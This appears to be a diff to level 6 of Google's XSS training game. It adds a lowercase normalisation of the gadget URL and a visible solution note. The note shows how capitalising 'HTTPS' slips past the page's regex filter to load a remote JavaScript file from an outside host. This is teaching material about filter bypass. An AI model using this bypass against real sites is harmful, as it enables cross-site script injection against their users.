@@ -16,6 +16,8 @@
  
     function includeGadget(url) {
       var scriptEl = document.createElement('script');
+
+      url = url.toLowerCase();
  
       // This will totally prevent us from loading evil URLs!
       if (url.match(/^https?:\/\//)) {
@@ -60,6 +62,13 @@
   <body id="level6">
     <img src="https://xss-game.appspot.com/static/logos/level6.png">
     <img id="cube" src="https://xss-game.appspot.com/static/level6_cube.png">
+    <div>
+        Solution: when entering a link to js file in query line write any letter of 'https' in capital
+        <div>HTTPS://local.dev.wickes.co.uk:9002/_ui/addons/b2caddon/responsive/common/js/xss.js</div>
+        <div>or</div>  
+        <div>HtTps://local.dev.wickes.co.uk:9002/_ui/addons/b2caddon/responsive/common/js/xss.js</div>
+        <div>or any other variant on your choice</div>
+      </div>
     <div id="log">Loading gadget...</div>
   </body>
 </html>
